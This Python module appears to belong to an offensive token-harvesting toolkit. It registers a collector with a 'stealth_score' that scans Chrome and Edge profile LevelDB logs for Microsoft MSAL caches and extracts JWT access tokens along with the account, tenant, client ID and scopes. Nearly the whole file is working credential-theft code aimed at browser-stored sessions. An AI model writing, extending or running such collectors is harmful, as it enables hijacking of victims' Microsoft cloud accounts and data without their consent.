"""Microsoft browser MSAL token collector — looks for MSAL cache in Chrome/Edge LevelDB."""

from __future__ import annotations

import json
import os
import re
from pathlib import Path
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import chrome_user_data_dir, edge_user_data_dir


@CollectorRegistry.register
class MicrosoftBrowserCollector(BaseCollector):
    service = "microsoft"
    source = "browser"
    stealth_score = 5

    def _find_msal_dirs(self) -> List[Path]:
        """Find Local Storage LevelDB dirs that may contain MSAL tokens."""
        dirs = []
        for base_dir in [chrome_user_data_dir(), edge_user_data_dir()]:
            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                ls_dir = base_dir / profile / "Local Storage" / "leveldb"
                if ls_dir.exists():
                    dirs.append(ls_dir)
        return dirs

    def _scan_log_files(self, leveldb_dir: Path) -> List[dict]:
        """Scan .log files in LevelDB dir for MSAL token patterns.

        This is a basic heuristic — .log files contain recent writes in plaintext.
        Full LevelDB parsing would require a library.
        """
        tokens_found = []
        for log_file in leveldb_dir.glob("*.log"):
            try:
                # Read as binary, decode what we can
                raw = log_file.read_bytes()
                text = raw.decode("utf-8", errors="replace")

                # Look for MSAL access token cache entries
                # Pattern: "accessToken" followed by JSON-like structures
                if "accessToken" in text or "msal" in text.lower():
                    tokens_found.append({
                        "path": str(log_file),
                        "has_access_token": "accessToken" in text,
                        "has_refresh_token": "refreshToken" in text,
                        "has_msal": "msal" in text.lower(),
                    })
            except Exception:
                continue
        return tokens_found

    def discover(self) -> List[DiscoveredToken]:
        results = []
        for ls_dir in self._find_msal_dirs():
            findings = self._scan_log_files(ls_dir)
            for f in findings:
                browser_name = "edge" if "Edge" in f["path"] else "chrome"
                details_parts = []
                if f["has_access_token"]:
                    details_parts.append("has_access_token")
                if f["has_refresh_token"]:
                    details_parts.append("has_refresh_token")

                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=f["path"],
                    account_hint=browser_name,
                    stealth_score=self.stealth_score,
                    details=", ".join(details_parts) if details_parts else "MSAL cache detected",
                ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Basic extraction from LevelDB log files.

        This is a best-effort approach — full extraction would need LevelDB bindings.
        """
        results = []
        for ls_dir in self._find_msal_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")

                    # Try to find JSON blobs containing access tokens
                    # MSAL stores tokens as JSON values in Local Storage
                    for match in re.finditer(r'\{[^{}]*"secret"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)"[^{}]*\}', text):
                        try:
                            token_val = match.group(1)
                            # Try to parse the surrounding JSON for metadata
                            json_str = match.group(0)
                            meta = json.loads(json_str)

                            results.append(CollectedToken(
                                service=self.service,
                                source=self.source,
                                stealth_score=self.stealth_score,
                                username=meta.get("home_account_id", "").split(".")[0] if meta.get("home_account_id") else None,
                                tenant_id=meta.get("realm"),
                                access_token=secure(token_val),
                                client_id=meta.get("client_id"),
                                scopes=meta.get("target", "").split() if meta.get("target") else None,
                                extra={
                                    "credential_type": meta.get("credential_type"),
                                    "environment": meta.get("environment"),
                                    "browser": "edge" if "Edge" in str(log_file) else "chrome",
                                },
                            ))
                        except (json.JSONDecodeError, AttributeError):
                            continue
                except Exception:
                    continue

        return results
